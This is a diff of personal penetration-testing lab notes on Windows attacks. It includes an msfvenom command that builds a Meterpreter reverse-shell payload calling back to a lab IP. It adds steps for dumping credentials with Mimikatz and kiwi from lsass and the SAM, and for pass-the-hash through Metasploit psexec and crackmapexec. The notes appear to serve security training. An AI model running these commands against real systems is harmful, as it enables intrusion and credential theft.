@@ -149,7 +149,6 @@ Windows stores hashed user account passwords locally in the SAM (Security Accoun
 	- C:\Windows\Panther\Unattend.xml
 	- C:\Windows\Panther\Autounattend.xml
 	- might be base64 encoded password
-
 LAB
 1. `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=4444 -f exe > payload.exe` : make payload
 2. `python -m SimpleHTTPServer 80` : set up local server
@@ -162,11 +161,58 @@ LAB
 	5. run : listen for callback from target
 		1. search -f Unattend.xml
 base64 -d password.txt
-
 - `psexec.py Administrator@target`
 	- password
 	- shell access
 
+---
+#### MIMIKATZ
+Extract passwords from running memory
+Lab
+1. need to get access, badblue
+2. get meterpreter
+3. `pgrep lsass` > `migrate` to PID
+4. `load kiwi` : ? for help
+5. `creds_all` grabs hashes
+6. `lsa_dump_sam` grabs syskey and others hashes
+Using mimikats
+1. upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
+2. shell
+	1. `.\mimikatz.exe`
+	2. `privilege::debug` check if you have privilege
+	3. `lsadump::sam` dumps hashes
+	4. `lsadump::secrets` 
+	5. `sekurlsa::logonpasswords`  might show some cleartext
+
+#### Pass-The-Hash
+Metasploit PsExec module
+1. get meterpreter access
+	1. migrate to lasass
+	2. load kiwi
+	3. dump the Administrator hash
+	4. hashdump to get lm hash, same for all users
+2. search psexec for authenticated user
+	1. set rhosts
+	2. set lhosts 4445
+	3. set smbuser administrator
+	4. setpass HASH
+	5. set target Native\ upload
+
+crackmapexec
+`crackmapexec smb 10.2.34.3 -u Administrator -H "lm:ntlm" -x "ipconfig"`
+use hash to run a command
+
 
 ---
 ## Linux Attacks
+
+### Services
+
+| Service | Port   | Description            |
+| ------- | ------ | ---------------------- |
+| Apache  | 80/443 | Apache Web Server      |
+| SSH     | 22     | Secure Shell           |
+| FTP     | 21     | File Transfer Protocol |
+| SAMBA   | 445    | SMB implementation     |
+
+---
